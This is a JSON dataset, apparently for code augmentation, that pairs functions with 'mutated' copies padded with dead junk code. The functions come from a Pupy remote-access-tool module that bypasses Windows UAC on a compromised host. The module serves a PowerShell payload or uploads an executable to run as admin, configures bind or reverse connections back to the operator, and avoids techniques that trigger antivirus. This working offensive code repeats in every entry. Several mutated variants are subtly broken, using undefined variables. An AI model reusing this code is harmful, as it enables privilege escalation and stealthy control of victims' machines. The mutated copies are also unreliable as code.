[
    {
        "func_name": "init_argparse",
        "original": "@classmethod\ndef init_argparse(cls):\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')",
        "mutated": [
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cls.arg_parser = PupyArgumentParser(prog='bypassuac', description=cls.__doc__)\n    cls.arg_parser.add_argument('-l', dest='scan', action='store_true', default=False, help='List all possible techniques for this host')\n    cls.arg_parser.add_argument('-e', dest='exe', default=None, help='Custom exe to execute as admin')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Restart current executable as admin')\n    cls.arg_parser.add_argument('-m', dest='method', help='Should be an ID, get the list scanning which methods are possible (-l)')"
        ]
    },
    {
        "func_name": "parse_result",
        "original": "def parse_result(self, result, print_result=True, get_method_id=True):\n    \"\"\"\n        Parse result returned by WinPwnage\n        Return the best method id if possible\n        \"\"\"\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p",
        "mutated": [
            "def parse_result(self, result, print_result=True, get_method_id=True):\n    if False:\n        i = 10\n    '\\n        Parse result returned by WinPwnage\\n        Return the best method id if possible\\n        '\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p",
            "def parse_result(self, result, print_result=True, get_method_id=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        Parse result returned by WinPwnage\\n        Return the best method id if possible\\n        '\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p",
            "def parse_result(self, result, print_result=True, get_method_id=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        Parse result returned by WinPwnage\\n        Return the best method id if possible\\n        '\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p",
            "def parse_result(self, result, print_result=True, get_method_id=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        Parse result returned by WinPwnage\\n        Return the best method id if possible\\n        '\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p",
            "def parse_result(self, result, print_result=True, get_method_id=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        Parse result returned by WinPwnage\\n        Return the best method id if possible\\n        '\n    func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}\n    preferred_methods = self.client.pupsrv.config.get('bypassuac', 'preferred_methods').split(',')\n    method_id = []\n    for (tag, message) in result:\n        if tag in func:\n            if print_result:\n                func[tag](message)\n            if tag == 'ok' and get_method_id:\n                method_id.append(message.split()[0])\n    if get_method_id:\n        for p in preferred_methods:\n            if p in method_id:\n                return p"
        ]
    },
    {
        "func_name": "launch_scan",
        "original": "def launch_scan(self, print_result=True):\n    \"\"\"\n        Check all possible methods found on the target to bypass uac\n        \"\"\"\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)",
        "mutated": [
            "def launch_scan(self, print_result=True):\n    if False:\n        i = 10\n    '\\n        Check all possible methods found on the target to bypass uac\\n        '\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)",
            "def launch_scan(self, print_result=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        Check all possible methods found on the target to bypass uac\\n        '\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)",
            "def launch_scan(self, print_result=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        Check all possible methods found on the target to bypass uac\\n        '\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)",
            "def launch_scan(self, print_result=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        Check all possible methods found on the target to bypass uac\\n        '\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)",
            "def launch_scan(self, print_result=True):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        Check all possible methods found on the target to bypass uac\\n        '\n    scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)\n    result = scanner(uac=True, persist=False, elevate=False, execute=False).start()\n    return self.parse_result(result, print_result)"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self, args):\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)",
        "mutated": [
            "def run(self, args):\n    if False:\n        i = 10\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in 